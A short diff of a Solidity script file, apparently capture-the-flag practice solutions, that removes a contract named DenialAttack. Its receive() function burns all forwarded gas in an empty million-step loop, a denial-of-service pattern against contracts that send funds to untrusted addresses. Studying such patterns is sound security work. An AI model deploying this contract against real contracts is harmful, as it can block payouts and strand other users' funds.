@@ -134,9 +134,3 @@ contract DexSolution is Script {
         console.log("Swapper token2 balance:", token2.balanceOf(swapper));
     }
 }
-
-contract DenialAttack {
-    receive() external payable {
-        for (uint256 i = 0; i < 1_000_000; i++) {}
-    }
-}
